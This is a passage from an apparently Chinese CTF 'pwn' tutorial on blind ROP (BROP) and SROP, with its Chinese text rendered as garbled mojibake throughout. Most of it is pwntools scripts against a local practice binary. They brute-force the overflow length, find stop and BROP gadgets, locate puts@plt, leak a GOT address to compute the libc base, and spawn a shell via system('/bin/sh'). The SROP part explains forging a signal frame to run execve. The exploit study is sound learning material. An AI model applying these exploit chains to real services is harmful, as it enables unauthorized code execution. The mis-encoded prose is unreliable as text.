ä¸ºæˆ‘ä»¬æ˜¯ä»0x400000å¤„å¼€å§‹dumpçš„ï¼Œæ‰€ä»¥åŸºåœ°å€å°±è®¾ä¸º0x400000<br>è®¾ç½®æ­¥éª¤ï¼šedit-&gt;segments-&gt;rebase program å°†ç¨‹åºçš„åŸºåœ°å€æ”¹ä¸º 0x400000<br>ç”±äºæˆ‘ä»¬ä¹‹å‰æ‰¾åˆ°äº†putså‡½æ•°çš„pltåœ°å€0x400560ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°åç§»0x560å¤„<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206220625.png" alt="Pasted image 20250206220625"></p><h5 id="6-æŸ¥è¯¢libcç‰ˆæœ¬"><a href="#6-æŸ¥è¯¢libcç‰ˆæœ¬" class="headerlink" title="6.æŸ¥è¯¢libcç‰ˆæœ¬"></a>6.æŸ¥è¯¢libcç‰ˆæœ¬</h5><p><a href="https://libc.blukat.me/">libc database search</a><br>è¿™é‡Œæˆ‘ä»¬ç›´æ¥è°ƒç”¨æœ¬åœ°çš„å°±è¡Œ</p><h5 id="7-getshell"><a href="#7-getshell" class="headerlink" title="7.getshell"></a>7.getshell</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400565</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">ret = brop_gadget + <span class="number">9</span> + <span class="number">1</span></span><br><span class="line">sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">puts_addr =u64(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>æˆåŠŸget shell<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206224413.png" alt="Pasted image 20250206224413"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#1.æš´åŠ›æšä¸¾å‡ºæ ˆæº¢å‡ºé•¿åº¦</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsize</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            p.send(i*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:<span class="comment">#ä¸»è¦æ¢æµ‹æ˜¯å¦å…·æœ‰canary</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">size = getsize()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;size is : %s &quot;</span>% size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop</span>():</span><br><span class="line">    addr = <span class="number">0x4005cf</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,trying the address is &quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(addr)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,the payload is &quot;</span>,payload)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;main funciton--&gt;[%s]&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;one success addr : 0x%x&#x27;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;a bad addr&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Can&#x27;t connect,retrying&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">data = get_stop()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Success,call Main Function address is&quot;</span>,<span class="built_in">hex</span>(data))</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>): <span class="comment">#æŸ¥æ‰¾brop gadgetå‡½æ•°</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget) </span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> (content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">          <span class="comment">#åˆ¤æ–­æç¤ºç¬¦æ˜¯å¦å‡ºç°èµ·å§‹æç¤ºå­—ç¬¦ï¼Œå¦‚æœæœ‰è¯´æ˜ç¨‹åºæ²¡å´©æºƒ</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):<span class="comment">#æ£€æŸ¥åœ°å€</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4</span></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">addr = <span class="number">0x4007b0</span> </span><br><span class="line"><span class="comment">#ç†è®ºä¸Šåº”è¯¥ä»0x400000å¼€å§‹å¯»æ‰¾ï¼Œä½†æ˜¯è¿™ä¸ªç¯èŠ‚è¦æ‰¾çš„æ˜¯Libc_csu_initå‡½æ•°ï¼Œæ‰€ä»¥å¤§å¤šæ•°çš„libcä¸­Libc_csu_initå‡½æ•°çš„èµ·å§‹åœ°å€éƒ½åœ¨0x400740ä¹‹åï¼Œæ‰€ä»¥ä¸ºäº†å‡å°‘è¯¯å·®ï¼Œä»0x400740å¼€å§‹</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  <span class="comment">#å¾ªç¯é€’å¢è¦æµ‹è¯•çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400559</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72ä¸ªAå¡«å……æ ˆç©ºé—´ï¼Œè°ƒç”¨pop rdiï¼›ret gadgetå°†0x400000popè¿›rdiå¯„å­˜å™¨ï¼Œå¾ªç¯å¢é•¿çš„åœ°å€æ”¾åœ¨gadgetçš„retä½ç½®ï¼Œåœ¨æ‰§è¡Œå®Œgadgetåç›´æ¥è°ƒç”¨å¾ªç¯å¢é•¿çš„åœ°å€ï¼Œå¦‚æœå¢é•¿åˆ°puts_pltåœ°å€å°±ä¼šæ‰“å°rdiå¯„å­˜å™¨ä¸­åœ°å€å†…å­˜æ”¾çš„å­—ç¬¦ä¸²ï¼Œæœ€åçš„stop gadgetæ˜¯ä¸ºäº†è®©ç¨‹åºä¸å´©æºƒ</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):<span class="comment">#åˆ¤æ–­æ˜¯å¦æ‰“å°\x7fELF</span></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">rdi_ret = <span class="number">0x4007ba</span>+<span class="number">0x9</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">puts = get_puts_addr(length,rdi_ret,stop_gadget)</span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400565</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">ret = brop_gadget + <span class="number">9</span> + <span class="number">1</span><span class="comment">#æ ˆå¯¹é½</span></span><br><span class="line">sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">puts_addr =u64(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ğŸ˜­SROP-æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­"><a href="#ğŸ˜­SROP-æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­" class="headerlink" title="ğŸ˜­SROP(æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­)"></a>ğŸ˜­SROP(æš‚æ—¶å­¦ä¸æ‡‚ï¼Œå¾…ç»­)</h2><p><a href="https://xz.aliyun.com/news/12644">æ–‡ç«  - é«˜çº§ROPä¹‹SROPåˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº</a><br>SROPï¼Œå…¨ç§°ä¸ºSigreturn Oriented Programmingï¼Œä¸»è¦è§¦å‘åŸç†ä¸º<code>sigreturn</code>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¸€èˆ¬æ˜¯ç¨‹åºåœ¨å‘ç”Ÿ signal çš„æ—¶å€™è¢«é—´æ¥åœ°è°ƒç”¨</p><h3 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h3><p>åˆ†æå†…æ ¸åœ¨ signal ä¿¡å·å¤„ç†çš„è¿‡ç¨‹ä¸­çš„å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå†…æ ¸ä¸»è¦åšçš„å·¥ä½œå°±æ˜¯ä¸ºè¿›ç¨‹ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æ¢å¤ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸»è¦çš„å˜åŠ¨éƒ½åœ¨ Signal Frame ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li><strong>Signal Frame è¢«ä¿å­˜åœ¨ç”¨æˆ·çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ˜¯å¯ä»¥è¯»å†™çš„ã€‚</strong></li><li><p>ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ (kernel agnostic about signal handlers)ï¼Œå®ƒå¹¶ä¸ä¼šå»è®°å½•è¿™ä¸ª signal å¯¹åº”çš„ Signal Frameï¼Œ<strong>æ‰€ä»¥å½“æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæ­¤æ—¶çš„ Signal Frame å¹¶ä¸ä¸€å®šæ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„ Signal Frame</strong>ã€‚<br>è¯´åˆ°è¿™é‡Œï¼Œå…¶å®ï¼ŒSROP çš„åŸºæœ¬åˆ©ç”¨åŸç†ä¹Ÿå°±å‡ºç°äº†ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>çœ‹å®ŒåŸç†ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œ<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ä¼šå°†è¿›ç¨‹æ¢å¤ä¸º<strong>ä¹‹å‰â€ä¿å­˜çš„</strong>â€œï¼Œä¹Ÿå°±æ˜¯ä»æ ˆä¸­popå›åˆ°å„å¯„å­˜å™¨ï¼Œåœ¨æ‰§è¡Œ<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨æœŸé—´ï¼Œæˆ‘ä»¬å¯¹æ ˆä¸­çš„å€¼æ˜¯å¯ä»¥ä»»æ„è¯»å†™çš„ï¼Œè€Œä¸”ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ï¼Œ <code>signal</code> å¯¹åº”çš„å„ä¸ªå¯„å­˜å™¨å€¼å¹¶ä¸ä¼šè¢«è®°å½•ï¼Œé‚£ä¹ˆï¼Œåªè¦æˆ‘ä»¬èƒ½å¤ŸåŠ«æŒæ ˆä¸­çš„æ•°æ®ï¼Œä¼ªé€ ä¸€ä¸ª <code>Signal Frame</code> ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶ä»»æ„å¯„å­˜å™¨çš„å€¼</p><h4 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h4><p>é¦–å…ˆï¼Œæˆ‘ä»¬å‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æˆ·è¿›ç¨‹çš„æ ˆï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª Signal Frameï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œä»¥ 64 ä½ä¸ºä¾‹å­ï¼Œç»™å‡º Signal Frame æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180326.png" alt="Pasted image 20250207180326"><br>å½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellã€‚è·å–shellå®é™…ä¸Šå°±æ˜¯æ‰§è¡Œäº†ç³»ç»Ÿè°ƒç”¨ execve(â€œ/bin/shâ€,0,0)<br>è·å–shelléœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p></li><li><p>æ ˆæº¢å‡ºä»¥æ§åˆ¶æ ˆçš„å†…å®¹</p></li><li>èƒ½æ§åˆ¶raxå¯„å­˜å™¨ä¸º<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„è°ƒç”¨å·</li><li>æœ‰syscallç³»ç»Ÿè°ƒç”¨å‡½æ•°æˆ–è€…æ±‡ç¼–ä»£ç </li><li>æ ˆç©ºé—´è¶³å¤Ÿå¤§</li></ul><p>å…·ä½“SROPæ“ä½œå¦‚ä¸‹</p><ol><li>é€šè¿‡æ ˆæº¢å‡ºåŠ«æŒè¿”å›åœ°å€ï¼Œæ„é€ SROP</li><li>æ§åˆ¶raxå¯„å­˜å™¨ä¸º<code>sigreturn</code> çš„ç³»ç»Ÿè°ƒç”¨å·</li><li>æ‰§è¡Œsyscallè¿›å…¥<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨</li><li>æ§åˆ¶æ ˆå¸ƒå±€ï¼Œä½¿<code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ç»“æŸåçš„popæŒ‡ä»¤èƒ½å¤Ÿå‡†ç¡®æ§åˆ¶å„ä¸ªå¯„å­˜å™¨æˆæˆ‘ä»¬æƒ³è¦çš„å€¼<br> ä¾‹å¦‚è·å–shellçš„å„å¯„å­˜å™¨æ§åˆ¶ï¼š<br> rax â€”&gt;59ï¼ˆexecveçš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰<br> rdi â€”&gt; â€˜/bin/shâ€™<br> rsi â€”&gt; 0<br> rdx â€”&gt;0<br> rip â€”&gt; syscall<br> æ­¤æ—¶å†ç»§ç»­å‘ä¸‹è°ƒç”¨æ—¶å°±å¯ä»¥æ‰§è¡Œexecve(â€œ/bin/shâ€,0,0)äº†<h4 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h4>éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯å•ç‹¬çš„è·å¾—ä¸€ä¸ª shellã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯</li></ol><ul><li><strong>æ§åˆ¶æ ˆæŒ‡é’ˆã€‚</strong></li><li><strong>æŠŠåŸæ¥ rip æŒ‡å‘çš„<code>syscall</code> gadget æ¢æˆ<code>syscall; ret</code> gadgetã€‚</strong><br>å¦‚ä¸‹å›¾æ‰€ç¤º ï¼Œè¿™æ ·å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180429.png" alt="Pasted image 20250207180429"><h4 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h4>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ„é€  ROP æ”»å‡»çš„æ—¶å€™ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</li><li><strong>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹</strong></li><li><strong>éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€</strong><ul><li><strong>â€œ/bin/shâ€</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>éœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª sigal frame<br>æ­¤å¤–ï¼Œå…³äº sigreturn ä»¥åŠ syscall;ret è¿™ä¸¤ä¸ª gadget åœ¨ä¸Šé¢å¹¶æ²¡æœ‰æåŠã€‚æå‡ºè¯¥æ”»å‡»çš„è®ºæ–‡ä½œè€…å‘ç°äº†è¿™äº› gadgets å‡ºç°çš„æŸäº›åœ°å€ï¼š<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180522.png" alt="Pasted image 20250207180522">å¹¶ä¸”ï¼Œä½œè€…å‘ç°ï¼Œæœ‰äº›ç³»ç»Ÿä¸Š SROP çš„åœ°å€è¢«éšæœºåŒ–äº†ï¼Œè€Œæœ‰äº›åˆ™æ²¡æœ‰ã€‚æ¯”å¦‚è¯´<code>Linux &lt; 3.3 x86_64</code>ï¼ˆåœ¨ Debian 7.0ï¼Œ Ubuntu Long Term Supportï¼Œ CentOS 6 ç³»ç»Ÿä¸­é»˜è®¤å†…æ ¸)ï¼Œå¯ä»¥ç›´æ¥åœ¨ vsyscall ä¸­çš„å›ºå®šåœ°å€å¤„æ‰¾åˆ° syscall&amp;return ä»£ç ç‰‡æ®µã€‚å¦‚ä¸‹<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180547.png" alt="Pasted image 20250207180547">ä½†æ˜¯ç›®å‰å®ƒå·²ç»è¢«<code>vsyscall-emulate</code>å’Œ<code>vdso</code>æœºåˆ¶ä»£æ›¿äº†ã€‚æ­¤å¤–ï¼Œç›®å‰å¤§å¤šæ•°ç³»ç»Ÿéƒ½ä¼šå¼€å¯ ASLR ä¿æŠ¤ï¼Œæ‰€ä»¥ç›¸å¯¹æ¥è¯´è¿™äº› gadgets éƒ½å¹¶ä¸å®¹æ˜“æ‰¾åˆ°ã€‚</li></ul><p><em>å€¼å¾—ä¸€è¯´çš„æ˜¯ï¼Œå¯¹äº sigreturn ç³»ç»Ÿè°ƒç”¨æ¥è¯´ï¼Œåœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œsigreturn ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15ï¼Œåªéœ€è¦ RAX=15ï¼Œå¹¶ä¸”æ‰§è¡Œ syscall å³å¯å®ç°è°ƒç”¨ syscall è°ƒç”¨ã€‚è€Œ RAX å¯„å­˜å™¨çš„å€¼åˆå¯ä»¥é€šè¿‡æ§åˆ¶æŸä¸ªå‡½æ•°çš„è¿”å›å€¼æ¥é—´æ¥æ§åˆ¶ï¼Œæ¯”å¦‚è¯´ read å‡½æ•°çš„è¿”å›å€¼ä¸ºè¯»å–çš„å­—èŠ‚æ•°ã€‚</em></p><h4 id="å®é™…åˆ©ç”¨"><a href="#å®é™…åˆ©ç”¨" class="headerlink" title="å®é™…åˆ©ç”¨"></a>å®é™…åˆ©ç”¨</h4><p><img 